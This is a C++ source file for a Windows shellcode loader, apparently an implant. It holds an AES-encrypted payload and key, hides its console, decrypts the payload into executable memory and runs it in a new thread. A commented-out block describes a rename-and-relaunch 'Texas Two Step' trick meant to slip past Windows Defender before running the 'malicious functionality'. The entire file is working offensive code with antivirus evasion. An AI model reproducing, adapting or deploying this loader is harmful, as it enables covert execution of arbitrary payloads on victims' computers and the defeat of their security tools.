#include <Windows.h>
#include <iostream>
#include <pathcch.h>
#include <shlwapi.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "shlwapi.lib")
#include <psapi.h>


unsigned char payload[] = { 0x6e, 0xf4, 0x25, 0xa9, 0x3a, 0xb4, 0xe0, 0xc4, 0xf3, 0x73, 0xb8, 0x7b, 0x67, 0x30, 0xef, 0xb4, 0xd4, 0xb3, 0xa5, 0x6f, 0xa6, 0x99, 0x7f, 0x34, 0x27, 0x6d, 0x54, 0xcf, 0xa3, 0x92, 0xa7, 0x1e, 0x2c, 0xf7, 0xcd, 0xa0, 0x60, 0x65, 0x44, 0x66, 0x3f, 0x90, 0x4f, 0x58, 0xe0, 0xf4, 0xc4, 0x15, 0xf9, 0x97, 0xa4, 0x68, 0x9f, 0xa0, 0xe3, 0x7b, 0xb4, 0x3a, 0xa2, 0xee, 0x10, 0x90, 0xdc, 0x88, 0x47, 0xbd, 0xa0, 0x0, 0x31, 0x49, 0x56, 0x92, 0xdb, 0x55, 0xf8, 0xbc, 0xc1, 0x51, 0x9e, 0x9, 0x91, 0x9a, 0x28, 0x49, 0x9e, 0x3c, 0x6e, 0x4, 0x49, 0x83, 0x78, 0x31, 0xe, 0xca, 0x8e, 0x4b, 0x8c, 0x53, 0x2b, 0x27, 0xe0, 0xd4, 0x1f, 0x5, 0x28, 0xc0, 0x83, 0xfa, 0xbb, 0x4a, 0x7d, 0x5e, 0xdf, 0xb4, 0x23, 0xad, 0x9a, 0xc4, 0x8e, 0xbd, 0x1a, 0x49, 0xdd, 0xe, 0xe4, 0xf4, 0x43, 0xab, 0xce, 0xd4, 0x10, 0x5b, 0xcd, 0x73, 0xf6, 0x49, 0x6a, 0xab, 0x49, 0xe4, 0xd0, 0x99, 0xbb, 0xd7, 0x73, 0x8b, 0x9a, 0xe8, 0xe9, 0x2, 0xb9, 0x3c, 0xcc, 0x4e, 0x91, 0x4c, 0x4f, 0xf5, 0x6b, 0xfe, 0x69, 0xa4, 0x52, 0x13, 0xe3, 0x84, 0xbd, 0x1d, 0xa4, 0xd0, 0x2b, 0x54, 0x4c, 0xe3, 0x91, 0xaa, 0x8e, 0x30, 0xe9, 0x48, 0x27, 0x62, 0xa4, 0x4d, 0x51, 0x99, 0x76, 0xda, 0xa3, 0x5d, 0xaf, 0xcb, 0xa1, 0x38, 0xec, 0x89, 0xe5, 0x4e, 0xb3, 0x1b, 0x3f, 0xb2, 0x51, 0x6e, 0x9f, 0xf3, 0x3c, 0xf, 0xb8, 0xf7, 0xfa, 0xed, 0x75, 0xb1, 0xd3, 0x98, 0xab, 0x52, 0xff, 0x38, 0xac, 0xd5, 0xd8, 0x45, 0xa, 0x62, 0x9, 0x80, 0xb, 0x6b, 0xe, 0x5b, 0x29, 0x17, 0xe, 0x59, 0x1e, 0x6a, 0x7c, 0x28, 0x53, 0x6b, 0x24, 0x37, 0x8a, 0x2a, 0xcf, 0x9f, 0xb2, 0x23, 0xf6, 0x7d, 0x46, 0x8c, 0xa, 0x4d, 0xf4, 0xba, 0xda, 0x97, 0x1e, 0x49, 0xe7, 0x18, 0xa0, 0x79, 0x7c, 0xde, 0x9b, 0x3c, 0xd8, 0x3, 0x7d, 0x67, 0xe4, 0xf8, 0x1c, 0x4c, 0xd5, 0x6c, 0xc3, 0x60, 0x4b, 0xbd, 0x91, 0x34, 0xb8, 0xa8, 0x9d, 0xbe, 0x47, 0xf5, 0xcc, 0x4c, 0xba, 0xe2, 0x54, 0x24, 0xb6, 0x31, 0xb6, 0xa4, 0x6c, 0x17, 0x1a, 0x1a, 0x24, 0xc5, 0xef, 0x90, 0x9d, 0x70, 0x68, 0x26, 0x26, 0x86, 0xf5, 0x9f, 0x16, 0x93, 0xc6, 0x67, 0xcb, 0x26, 0x2a, 0x81, 0x9b, 0xd0, 0xff, 0x49, 0xa2, 0xba, 0xf3, 0xb9, 0x49, 0xa0, 0xb0, 0x9f, 0x59, 0x28, 0x6a, 0xde, 0x36, 0xb6, 0x6b, 0x3a, 0x83, 0x18, 0xe1, 0x23, 0xfe, 0x79, 0x1c, 0x83, 0x8a, 0x45, 0xe1, 0xae, 0xa3, 0x36, 0xea, 0xcf, 0xa0, 0xc3, 0x28, 0x8e, 0x88, 0x34, 0xd0, 0x1f, 0x33, 0x9d, 0x70, 0x98, 0x90, 0x7b, 0xc6, 0xea, 0x3a, 0xbc, 0x8f, 0x38, 0x56, 0x8, 0x96, 0x6, 0xf, 0x77, 0xcb, 0xb3, 0xec, 0x3a, 0x33, 0x8a, 0x4e, 0x96, 0xc9, 0xb5, 0x87, 0x9, 0x61, 0xb6, 0xc, 0xfd, 0xde, 0x15, 0x74, 0x62, 0x5e, 0x31, 0x3f, 0xe8, 0x4a, 0x7, 0x27, 0xb, 0x6d, 0x93, 0xeb, 0xe8, 0x4f, 0xa9, 0x99, 0x2e, 0x4f, 0xa2, 0xb3, 0x5b, 0x26, 0x94, 0x67, 0x87, 0x98, 0x8f, 0x56, 0xc2, 0xba, 0x59, 0xef, 0x35, 0x81, 0xf2, 0x7f, 0xa8, 0x87, 0xe5, 0xdf, 0x6b, 0x3c, 0x18, 0x8e, 0x7e, 0x55, 0xdd, 0xb4, 0x97, 0x93, 0xa1, 0xf1, 0x53, 0xe9, 0x66, 0x70, 0x2e };
unsigned char key[] = { 0x7a, 0x7f, 0x49, 0xd, 0x2b, 0xec, 0xec, 0xd6, 0x34, 0x99, 0x4b, 0x2f, 0x45, 0xfc, 0x8f, 0xef };

size_t payload_len = sizeof(payload);
size_t key_len = sizeof(key);

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

int main(int argc, char * argv[])
{
	LPVOID exec_mem = NULL;
	HANDLE th = NULL;
	
	FreeConsole();
	//allocate executable payload in memory
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	
	//copy our encrypted payload into that memory
	RtlMoveMemory(exec_mem, payload, payload_len);

	//decrypt the payload in the that memory
	AESDecrypt((char*)exec_mem, payload_len, (char*)key, key_len);

	//create thread with our payload running
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
	if(th != NULL){
		WaitForSingleObject(th, -1);
	}
	
	
/*	
	DWORD dwError = ERROR_SUCCESS;
	LPVOID exec_mem = NULL;
	char lpFileName[200];
	LPSTR out = NULL;
	HANDLE th = NULL;
	
	//Check executable name
	int rv;
	GetModuleFileNameA(NULL, lpFileName, sizeof(lpFileName));

	out = PathFindFileNameA((LPCSTR)lpFileName);
	rv = strcmp(out, "implant.exe");


	switch (rv) {
		default:										//Texas Two Step, step 1. "safe" functionality
														//this functionality innoculates our PE to Windows Defender on Windows 11

			//rename executable
			rv = rename((const char*)out, "implant.exe");

			//Get Current Path+FileName
			GetModuleFileNameA(NULL, lpFileName, sizeof(lpFileName));

			//Remove FileName
			PathRemoveFileSpecA((LPSTR)lpFileName);
			
			//Add Correct FileName
			strcat(lpFileName, "\\implant.exe");
			
			//Call new instance
			WinExec((LPCSTR) lpFileName, 0);
			
			break;

		case 0:											//Texas Two Step, step 2. actual malicious functionality
		
			FreeConsole();
			//allocate executable payload in memory
			exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

			//copy our encrypted payload into that memory
			RtlMoveMemory(exec_mem, payload, payload_len);

			//create thread with our payload running
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
			
			
			break;

	}
*/
	return 0;
}

